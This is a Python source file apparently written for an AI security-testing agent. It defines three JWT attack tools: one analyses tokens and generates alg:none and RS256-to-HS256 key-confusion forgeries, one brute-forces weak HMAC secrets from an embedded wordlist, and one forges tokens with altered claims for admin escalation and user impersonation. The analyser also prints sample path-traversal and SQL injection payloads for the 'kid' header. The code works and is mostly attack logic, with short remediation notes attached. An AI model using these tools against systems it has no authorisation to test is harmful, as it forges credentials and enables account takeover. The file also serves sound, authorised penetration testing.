"""
JWT, OAuth & Token Attack Suite

Implements three agent tools for JSON Web Token (JWT) security testing:

  JWTAnalyzeTool      — decode JWT header/payload, identify algorithm, check for
                        alg:none vulnerability and RS256→HS256 key confusion.
  JWTBruteForceTool   — brute-force weak HMAC secrets using common wordlists.
  JWTForgeTool        — forge tokens with modified claims for role escalation
                        and user impersonation.

OWASP Mapping: A02:2021-Cryptographic Failures / A01:2021-Broken Access Control
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import truncate_output

logger = logging.getLogger(__name__)

OWASP_JWT_TAG = "A02:2021-Cryptographic Failures / A01:2021-Broken Access Control (JWT)"


# ---------------------------------------------------------------------------
# JWT utilities — pure Python (no PyJWT dependency required)
# ---------------------------------------------------------------------------

_B64_PADDING_RE = re.compile(r"[^A-Za-z0-9+/=_-]")


def _b64url_decode(segment: str) -> bytes:
    """Decode a Base64URL-encoded segment, padding as necessary."""
    seg = segment.replace("-", "+").replace("_", "/")
    pad = 4 - len(seg) % 4
    if pad != 4:
        seg += "=" * pad
    return base64.b64decode(seg)


def _b64url_encode(data: bytes) -> str:
    """Encode bytes as Base64URL without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _parse_jwt(token: str) -> Optional[Tuple[Dict, Dict, str]]:
    """Split and decode a JWT into (header, payload, signature_segment).

    Returns None if the token is malformed.
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _sign_hmac(header: Dict, payload: Dict, secret: str, algorithm: str = "HS256") -> str:
    """Create a HMAC-signed JWT string."""
    hdr_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    pay_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{hdr_b64}.{pay_b64}".encode()

    algo_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_func = algo_map.get(algorithm, hashlib.sha256)
    sig = hmac.new(secret.encode(), signing_input, hash_func).digest()
    sig_b64 = _b64url_encode(sig)
    return f"{hdr_b64}.{pay_b64}.{sig_b64}"


def _forge_none_alg(header: Dict, payload: Dict) -> str:
    """Create a JWT with alg:none (unsigned)."""
    forged_header = dict(header)
    forged_header["alg"] = "none"
    _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    pay_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    # Multiple none-alg variants (case variations for weak parsers)
    variants = []
    for alg_str in ("none", "None", "NONE", "nOnE"):
        alt_hdr = dict(forged_header)
        alt_hdr["alg"] = alg_str
        ahdr_b64 = _b64url_encode(json.dumps(alt_hdr, separators=(",", ":")).encode())
        variants.append(f"{ahdr_b64}.{pay_b64}.")
    return variants[0]  # Return primary variant; all are available in analysis output


def _detect_algorithm(header: Dict) -> str:
    """Extract algorithm from JWT header."""
    return header.get("alg", "unknown").upper()


def _check_exp(payload: Dict) -> Optional[str]:
    """Check if the JWT expiry (exp) is set and not in the past."""
    exp = payload.get("exp")
    if exp is None:
        return "exp claim missing — token never expires"
    remaining = exp - time.time()
    if remaining < 0:
        return f"Token expired {abs(remaining):.0f}s ago"
    return None


class JWTVulnerability(str, Enum):
    """Classification of JWT vulnerability."""
    NONE_ALG = "none_algorithm"          # alg:none accepted
    WEAK_SECRET = "weak_hmac_secret"     # Brute-forced HMAC secret
    RS256_HS256 = "rs256_hs256_confusion"  # Key confusion attack
    EXPIRED_ACCEPTED = "expired_accepted"
    NO_EXPIRY = "no_expiry_claim"
    MISSING_KID = "missing_kid"
    SENSITIVE_CLAIMS = "sensitive_in_claims"


# ---------------------------------------------------------------------------
# Common weak JWT secrets wordlist (embedded, no file I/O needed)
# ---------------------------------------------------------------------------

_WEAK_SECRETS: List[str] = [
    "secret", "password", "123456", "qwerty", "admin", "letmein",
    "changeme", "jwt_secret", "your-256-bit-secret", "HS256-secret",
    "supersecret", "p@ssw0rd", "welcome", "test", "development",
    "secret123", "mySecret", "secretkey", "jwttoken", "token",
    "api_secret", "app_secret", "auth_secret", "key", "signing_key",
    "private_key", "hmac_secret", "abcdefg", "1234567890",
    "verysecretkey", "notsosecret", "my-secret", "jwt-secret-key",
    "secret-key", "SecretKey", "SecretKey123!", "Password1",
    "",  # Empty secret
]


# ---------------------------------------------------------------------------
# JWTAnalyzeTool
# ---------------------------------------------------------------------------


class JWTAnalyzeTool(BaseTool):
    """Decode and analyse a JWT for security vulnerabilities.

    Checks performed:
    - Algorithm (none/weak HS256 vs RS256)
    - alg:none vulnerability — forges unsigned tokens
    - RS256→HS256 key confusion opportunity detection
    - Expiry (exp) claim presence and validity
    - Sensitive data in payload claims
    - kid header injection potential

    OWASP A02:2021-Cryptographic Failures
    """

    def __init__(
        self,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._project_id = project_id
        self._user_id = user_id
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="jwt_analyze",
            description=(
                "Decode a JWT token and analyse it for security vulnerabilities: "
                "alg:none attack, RS256→HS256 key confusion, weak secrets, missing "
                "expiry, and sensitive data in claims. Returns forged tokens for "
                "alg:none and key-confusion vectors. OWASP A02/A01."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "token": {
                        "type": "string",
                        "description": "The JWT token string to analyse (with or without 'Bearer ' prefix).",
                    },
                    "public_key": {
                        "type": "string",
                        "description": (
                            "Server's RSA public key (PEM format). Required to forge an RS256→HS256 "
                            "key-confusion token. Optional."
                        ),
                        "default": "",
                    },
                },
                "required": ["token"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        token: str,
        public_key: str = "",
        **kwargs: Any,
    ) -> str:
        # Strip Bearer prefix
        token = token.strip()
        if token.lower().startswith("bearer "):
            token = token[7:].strip()

        parsed = _parse_jwt(token)
        if not parsed:
            return "[jwt_analyze] Invalid JWT format — token must have 3 dot-separated segments."

        header, payload, sig = parsed
        algorithm = _detect_algorithm(header)
        vulnerabilities: List[Dict[str, Any]] = []

        # ── Check 1: alg:none ─────────────────────────────────────────────
        none_tokens = []
        for alg_str in ("none", "None", "NONE", "nOnE"):
            forged_header = dict(header)
            forged_header["alg"] = alg_str
            hdr_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
            pay_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            none_tokens.append(f"{hdr_b64}.{pay_b64}.")

        vulnerabilities.append({
            "type": JWTVulnerability.NONE_ALG.value,
            "detail": "Forged alg:none tokens generated — test if server accepts unsigned tokens",
            "forged_tokens": none_tokens[:2],
        })

        # ── Check 2: RS256 → HS256 key confusion ──────────────────────────
        if algorithm == "RS256" and public_key:
            # In key confusion, sign with HS256 using the public key as the HMAC secret
            confused_token = _sign_hmac(
                {**header, "alg": "HS256"},
                payload,
                public_key,
                "HS256",
            )
            vulnerabilities.append({
                "type": JWTVulnerability.RS256_HS256.value,
                "detail": "RS256→HS256 key-confusion token forged using provided public key",
                "forged_token": confused_token,
            })

        # ── Check 3: Expiry claim ─────────────────────────────────────────
        exp_issue = _check_exp(payload)
        if exp_issue:
            vulnerabilities.append({
                "type": JWTVulnerability.NO_EXPIRY.value,
                "detail": exp_issue,
            })

        # ── Check 4: Sensitive claims ─────────────────────────────────────
        sensitive_keys = ["password", "secret", "key", "api_key", "token", "credit_card", "ssn", "dob"]
        found_sensitive = [k for k in payload if any(s in k.lower() for s in sensitive_keys)]
        if found_sensitive:
            vulnerabilities.append({
                "type": JWTVulnerability.SENSITIVE_CLAIMS.value,
                "detail": f"Sensitive fields in payload: {found_sensitive}",
            })

        # ── Check 5: kid header injection ────────────────────────────────
        if "kid" in header:
            vulnerabilities.append({
                "type": JWTVulnerability.MISSING_KID.value,
                "detail": (
                    f"kid header present (value: {header['kid']!r}). "
                    "Test for SQL/path injection: kid='../../dev/null' or kid='; DROP TABLE keys;--'"
                ),
            })

        return self._format(token, header, payload, algorithm, vulnerabilities)

    def _format(
        self,
        token: str,
        header: Dict,
        payload: Dict,
        algorithm: str,
        vulnerabilities: List[Dict[str, Any]],
    ) -> str:
        lines = [
            "[jwt_analyze] JWT Security Analysis",
            "",
            "── Header ─────────────────────────────────",
            f"  {json.dumps(header, indent=2)}",
            "",
            "── Payload ────────────────────────────────",
            f"  {json.dumps(payload, indent=2)}",
            "",
            f"── Algorithm: {algorithm} {'⚠ (symmetric — brute-forceable)' if algorithm.startswith('HS') else ''}",
            f"  OWASP: {OWASP_JWT_TAG}",
            "",
            "── Vulnerability Analysis ─────────────────",
        ]
        for v in vulnerabilities:
            lines.append(f"  [{v['type'].upper()}]")
            lines.append(f"    {v['detail']}")
            if "forged_tokens" in v:
                for i, ft in enumerate(v["forged_tokens"]):
                    lines.append(f"    Forged token {i+1}: {ft[:120]}...")
            if "forged_token" in v:
                lines.append(f"    Forged token: {v['forged_token'][:120]}...")
            lines.append("")

        lines += [
            "── Remediation ────────────────────────────",
            "  1. Use RS256/ES256 asymmetric algorithms — never HS256 with public secrets",
            "  2. Explicitly validate the 'alg' header — reject 'none' unconditionally",
            "  3. Set short token lifetime (exp ≤ 15 min for access tokens)",
            "  4. Never store sensitive data in JWT payload — it is only Base64-encoded",
            "  5. Validate kid values server-side; never use them in SQL/filesystem operations",
        ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# JWTBruteForceTool
# ---------------------------------------------------------------------------


class JWTBruteForceTool(BaseTool):
    """Brute-force weak HMAC secrets for HS256/HS384/HS512 JWT tokens.

    Uses an embedded wordlist of common secrets. Also accepts a custom
    wordlist as a newline-separated string parameter.

    OWASP A02:2021-Cryptographic Failures
    """

    def __init__(
        self,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._project_id = project_id
        self._user_id = user_id
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="jwt_brute_force",
            description=(
                "Brute-force weak HMAC secrets for HS256/HS384/HS512 JWT tokens. "
                "Uses embedded common-secret wordlist plus optional custom wordlist. "
                "Returns cracked secret and a re-signed token for privilege escalation. "
                "OWASP A02:2021-Cryptographic Failures."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "token": {
                        "type": "string",
                        "description": "The JWT token to crack (HS256/HS384/HS512 only).",
                    },
                    "wordlist": {
                        "type": "string",
                        "description": "Newline-separated custom wordlist to try (in addition to embedded list).",
                        "default": "",
                    },
                    "max_candidates": {
                        "type": "integer",
                        "description": "Maximum number of secret candidates to try (default 500).",
                        "default": 500,
                    },
                },
                "required": ["token"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        token: str,
        wordlist: str = "",
        max_candidates: int = 500,
        **kwargs: Any,
    ) -> str:
        token = token.strip()
        if token.lower().startswith("bearer "):
            token = token[7:].strip()

        parsed = _parse_jwt(token)
        if not parsed:
            return "[jwt_brute_force] Invalid JWT format."

        header, payload, _ = parsed
        algorithm = _detect_algorithm(header)

        if not algorithm.startswith("HS"):
            return (
                f"[jwt_brute_force] Algorithm is {algorithm} — not an HMAC variant. "
                "Brute force only applies to HS256/HS384/HS512."
            )

        # Build candidate list
        candidates: List[str] = list(_WEAK_SECRETS)
        if wordlist:
            candidates += [s.strip() for s in wordlist.splitlines() if s.strip()]
        candidates = candidates[:max_candidates]

        # Verification: re-sign with each candidate and compare
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_sig_bytes = _b64url_decode(parts[2])

        algo_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_func = algo_map.get(algorithm, hashlib.sha256)

        cracked_secret: Optional[str] = None
        for secret in candidates:
            test_sig = hmac.new(secret.encode(), signing_input, hash_func).digest()
            if hmac.compare_digest(test_sig, original_sig_bytes):
                cracked_secret = secret
                break

        return self._format(token, header, payload, algorithm, cracked_secret, candidates)

    def _format(
        self,
        token: str,
        header: Dict,
        payload: Dict,
        algorithm: str,
        cracked_secret: Optional[str],
        candidates: List[str],
    ) -> str:
        lines = [
            "[jwt_brute_force] JWT HMAC Secret Brute Force",
            f"  Algorithm:    {algorithm}",
            f"  Candidates:   {len(candidates)}",
            "",
        ]
        if cracked_secret is not None:
            # Generate a privilege-escalated token
            escalated = dict(payload)
            for role_field in ("role", "user_role", "admin", "is_admin", "privilege"):
                if role_field in escalated:
                    escalated[role_field] = "admin"
            escalated_token = _sign_hmac(header, escalated, cracked_secret, algorithm)

            lines += [
                "  ⚠ SECRET CRACKED — Risk: CRITICAL",
                f"  OWASP: {OWASP_JWT_TAG}",
                "",
                f"  Secret:            {cracked_secret!r}",
                f"  Escalated token:   {escalated_token[:120]}...",
                "",
                "── Remediation ────────────────────────────",
                "  1. Rotate the JWT secret immediately",
                "  2. Use a cryptographically random secret ≥ 256 bits",
                "  3. Consider migrating to RS256/ES256 asymmetric keys",
                "  4. Implement key rotation policy and monitor for token misuse",
            ]
        else:
            lines += [
                f"  ✓ Secret not cracked with {len(candidates)}-entry wordlist.",
                "  Consider trying a larger wordlist or passphrase-based attacks.",
                f"  OWASP: {OWASP_JWT_TAG}",
            ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# JWTForgeTool
# ---------------------------------------------------------------------------


class JWTForgeTool(BaseTool):
    """Forge a modified JWT with altered claims for role escalation or user impersonation.

    Requires knowledge of the HMAC secret (use JWTBruteForceTool first) or the
    target must be vulnerable to alg:none (no secret required).

    OWASP A01:2021-Broken Access Control (JWT claim tampering)
    """

    def __init__(
        self,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._project_id = project_id
        self._user_id = user_id
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="jwt_forge",
            description=(
                "Forge a JWT with modified claims (role escalation, user impersonation). "
                "Supports: HMAC re-signing with known secret, alg:none unsigned tokens, "
                "and extending expiry. Provide the cracked secret from jwt_brute_force or "
                "leave empty for alg:none forgery. OWASP A01/A02."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "token": {
                        "type": "string",
                        "description": "Original JWT token to base the forgery on.",
                    },
                    "claim_overrides": {
                        "type": "object",
                        "description": (
                            "Claim key→value pairs to inject/override in the payload. "
                            "E.g. {\"role\": \"admin\", \"user_id\": 1, \"is_admin\": true}"
                        ),
                        "default": {},
                    },
                    "secret": {
                        "type": "string",
                        "description": "HMAC secret for re-signing (leave empty for alg:none).",
                        "default": "",
                    },
                    "algorithm": {
                        "type": "string",
                        "description": "Signing algorithm when re-signing with a secret.",
                        "enum": ["HS256", "HS384", "HS512"],
                        "default": "HS256",
                    },
                    "extend_expiry": {
                        "type": "integer",
                        "description": "Seconds to add to the exp claim (default 86400 = 1 day).",
                        "default": 86400,
                    },
                },
                "required": ["token"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        token: str,
        claim_overrides: Optional[Dict[str, Any]] = None,
        secret: str = "",
        algorithm: str = "HS256",
        extend_expiry: int = 86400,
        **kwargs: Any,
    ) -> str:
        token = token.strip()
        if token.lower().startswith("bearer "):
            token = token[7:].strip()

        parsed = _parse_jwt(token)
        if not parsed:
            return "[jwt_forge] Invalid JWT format."

        header, payload, _ = parsed
        claim_overrides = claim_overrides or {}

        # Build forged payload
        forged_payload = dict(payload)
        forged_payload.update(claim_overrides)

        # Extend expiry
        if "exp" in forged_payload and extend_expiry:
            forged_payload["exp"] = int(time.time()) + extend_expiry

        forged_tokens: List[Dict[str, str]] = []

        # ── Method 1: alg:none (always generated) ─────────────────────────
        for alg_variant in ("none", "None", "NONE"):
            nh = {**header, "alg": alg_variant}
            hb = _b64url_encode(json.dumps(nh, separators=(",", ":")).encode())
            pb = _b64url_encode(json.dumps(forged_payload, separators=(",", ":")).encode())
            forged_tokens.append({
                "method": f"alg:{alg_variant}",
                "token": f"{hb}.{pb}.",
            })

        # ── Method 2: HMAC re-sign with secret (if provided) ──────────────
        if secret:
            signed = _sign_hmac({**header, "alg": algorithm}, forged_payload, secret, algorithm)
            forged_tokens.append({
                "method": f"HMAC re-sign ({algorithm}) with provided secret",
                "token": signed,
            })

        return self._format(token, forged_payload, claim_overrides, forged_tokens)

    def _format(
        self,
        original_token: str,
        forged_payload: Dict,
        overrides: Dict,
        forged_tokens: List[Dict[str, str]],
    ) -> str:
        lines = [
            "[jwt_forge] JWT Forgery",
            "",
            "── Claim Overrides Applied ────────────────",
            f"  {json.dumps(overrides, indent=2)}",
            "",
            "── Forged Payload ─────────────────────────",
            f"  {json.dumps(forged_payload, indent=2)}",
            "",
            "── Forged Tokens ──────────────────────────",
        ]
        for ft in forged_tokens:
            lines.append(f"  [{ft['method']}]")
            lines.append(f"  {ft['token'][:160]}{'...' if len(ft['token']) > 160 else ''}")
            lines.append("")

        lines += [
            f"  OWASP: {OWASP_JWT_TAG}",
            "",
            "── Remediation ────────────────────────────",
            "  1. Verify token signature with the correct algorithm and key server-side",
            "  2. Never use client-supplied 'alg' header — pin the algorithm server-side",
            "  3. Validate all claims (sub, iss, aud, exp) on every request",
            "  4. Use short-lived tokens (≤15 min) with refresh token rotation",
        ]
        return truncate_output("\n".join(lines))


__all__ = [
    "JWTAnalyzeTool",
    "JWTBruteForceTool",
    "JWTForgeTool",
    "JWTVulnerability",
    "OWASP_JWT_TAG",
    "_b64url_decode",
    "_b64url_encode",
    "_parse_jwt",
    "_sign_hmac",
    "_forge_none_alg",
    "_detect_algorithm",
    "_check_exp",
    "_WEAK_SECRETS",
]
